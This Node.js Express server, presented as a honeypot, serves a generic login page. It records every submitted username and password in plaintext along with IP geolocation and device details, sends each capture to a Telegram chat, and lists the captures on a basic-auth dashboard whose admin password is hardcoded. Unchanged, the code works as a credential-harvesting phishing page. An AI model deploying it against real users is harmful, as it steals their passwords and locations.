const express = require('express');
const basicAuth = require('express-basic-auth');
const useragent = require('express-useragent');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 4000;
const LOG_FILE = path.join(__dirname, 'logs.json');

// Telegram Bot Configuration (Apna Bot Token aur Chat ID yahan daalein)
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// Middleware setup
app.use(useragent.express());
app.use(express.urlencoded({ extended: true }));

// Helper to prevent XSS by escaping HTML characters
function escapeHtml(text) {
    if (!text) return '';
    return String(text)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Function to send instant Telegram alert
async function sendTelegramAlert(logEntry) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
    
    const message = `🚨 *New Honeypot Capture!*\n\n` +
                    `👤 *User:* ${escapeHtml(logEntry.username)}\n` +
                    `🔑 *Pass:* ${escapeHtml(logEntry.password)}\n` +
                    `🌐 *IP:* ${logEntry.ip}\n` +
                    `📍 *Location:* ${logEntry.location?.city || 'N/A'}, ${logEntry.location?.country || 'N/A'}\n` +
                    `💻 *Device:* ${logEntry.browser} / ${logEntry.os}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (err) {
        console.error('Telegram alert failed:', err.message);
    }
}

// Helper function to read and append logs to file
function saveLog(newLog) {
    let logs = [];
    if (fs.existsSync(LOG_FILE)) {
        try {
            const data = fs.readFileSync(LOG_FILE, 'utf8');
            logs = JSON.parse(data);
        } catch (err) {
            logs = [];
        }
    }
    logs.push(newLog);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

// Public Trap Page (Root)
app.get('/', async (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Login Portal</title></head>
        <body style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
            <h2>System Login</h2>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Username" required style="padding: 8px; margin: 5px;"/><br>
                <input type="password" name="password" placeholder="Password" required style="padding: 8px; margin: 5px;"/><br>
                <button type="submit" style="padding: 8px 15px; margin-top: 10px;">Sign In</button>
            </form>
        </body>
        </html>
    `);
});

// Capture credentials when form is submitted
app.post('/login', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.useragent;
    const { username, password } = req.body;

    let geoData = {};
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        geoData = response.data;
    } catch (err) {
        console.error('IP lookup failed:', err.message);
    }

    const logEntry = {
        time: new Date().toLocaleString(),
        ip,
        username,
        password,
        browser: ua.browser,
        os: ua.os,
        device: ua.platform,
        location: geoData
    };

    saveLog(logEntry);
    await sendTelegramAlert(logEntry);

    res.send('<h3>Authentication Failed. Please try again.</h3>');
});

// Protected Admin Dashboard with Download Button & Sanitized Inputs
app.get('/dashboard', basicAuth({
    users: { 'admin': 'SuperSecretPassword123' },
    challenge: true,
    realm: 'HoneypotAdminArea'
}), (req, res) => {
    let logs = [];
    if (fs.existsSync(LOG_FILE)) {
        try {
            logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        } catch (err) {
            logs = [];
        }
    }

    const rows = logs.map(log => {
        const city = log.location && log.location.city ? log.location.city : 'N/A';
        const country = log.location && log.location.country ? log.location.country : 'N/A';
        
        return `
            <tr>
                <td>${escapeHtml(log.time)}</td>
                <td>${escapeHtml(log.ip)}</td>
                <td><strong>${escapeHtml(log.username)}</strong></td>
                <td><code style="background: #eee; padding: 2px 5px; border-radius: 3px;">${escapeHtml(log.password)}</code></td>
                <td>${escapeHtml(city)}, ${escapeHtml(country)}</td>
                <td>${escapeHtml(log.browser)} / ${escapeHtml(log.os)}</td>
            </tr>
        `;
    }).join('');

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Honeypot Dashboard</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 30px; background: #f4f4f9; color: #333; }
                h2 { color: #2c3e50; display: inline-block; }
                .btn { background-color: #27ae60; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; float: right; font-weight: bold; }
                .btn:hover { background-color: #219653; }
                table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-top: 20px; border-radius: 5px; overflow: hidden; clear: both; }
                th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; }
                th { background-color: #2c3e50; color: white; }
                tr:hover { background-color: #f1f1f1; }
            </style>
        </head>
        <body>
            <div>
                <h2>Captured Credentials & Visitor Logs</h2>
                <a href="/dashboard/download" class="btn">Download Logs (JSON)</a>
            </div>
            <p>Total Captures: <strong>${logs.length}</strong></p>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>IP Address</th>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Location</th>
                        <th>Browser / OS</th>
                    </tr>
                </thead>
                <tbody>
                    ${rows.length > 0 ? rows : '<tr><td colspan="6" style="text-align:center;">No logs captured yet.</td></tr>'}
                </tbody>
            </table>
        </body>
        </html>
    `);
});

// Protected Route to Download the JSON File
app.get('/dashboard/download', basicAuth({
    users: { 'admin': 'SuperSecretPassword123' },
    challenge: true,
    realm: 'HoneypotAdminArea'
}), (req, res) => {
    if (fs.existsSync(LOG_FILE)) {
        res.download(LOG_FILE);
    } else {
        res.status(404).send('No logs found to download.');
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`Honeypot Server running on port ${PORT}`);
});
